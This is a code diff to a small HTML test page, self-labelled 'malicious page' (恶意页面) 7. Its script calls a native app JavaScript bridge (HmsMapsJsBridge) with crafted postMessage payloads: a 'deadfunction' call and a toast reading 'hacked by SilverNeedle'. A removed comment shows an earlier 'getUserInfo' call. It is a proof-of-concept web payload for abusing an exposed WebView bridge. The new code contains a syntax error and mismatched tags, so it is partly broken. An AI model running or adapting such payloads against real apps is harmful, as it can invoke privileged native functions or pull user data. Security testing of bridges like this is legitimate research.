@@ -26,14 +26,14 @@
             var hack = function() {
                 try {
                     document.getElementById("text2").innerText = 'bridge is exist:' + window.HmsMapsJsBridge;
-                    document.getElementById("text3").innerText = 'bridge is exist:' + window.HmsMapsJsBridge.postMessage;
-                    // let str1 = "{'type':'getUserInfo', 'msgId':10086}";
-                    // let ret1 = window.HmsMapsJsBridge.postMessage(str1);
+                    document.getElementById("text3").innerText = 'function is exist:' + window.HmsMapsJsBridge.postMessage is;
+                    let str1 = "{'type':'deadfunction', 'msgId':10086}";
+                    let ret1 = window.HmsMapsJsBridge.postMessage(str1);
                     // document.getElementById("text4").innerText = ret1;
                     // console.log(ret1);
-                    let str2 = "{'type':'toast', 'masgId':10086, 'data':{'message':'hacked by SilverNeedle😄'}}";
+                    let str2 = "{'type':'toast', 'masgId':10087, 'data':{'message':'hacked by SilverNeedle😄'}}";
                     let ret2 = window.HmsMapsJsBridge.postMessage(str2);
-                    document.getElementById("text4").innerText = ret2;
+                    document.getElementById("text4").innerText = 'function result:' + ret2;
                     console.log(ret2);
                 } catch (error) {
                     console.error('执行出错', error);
@@ -48,9 +48,9 @@
     </script>
 </head>
 <body>
-    <h1 id="text1">恶意页面 6</h1>
-    <h1 id="text2">bridge is exist:</h1>
-    <h1 id="text3">function is exist:</h1>
-    <h1 id="text4">function result:</h1>
+    <h1 id="text1">恶意页面 7</h1>
+    <h2 id="text2">bridge is exist:</h1>
+    <h3 id="text3">function is exist:</h1>
+    <h4 id="text4">function result:</h1>
 </body>
 </html>
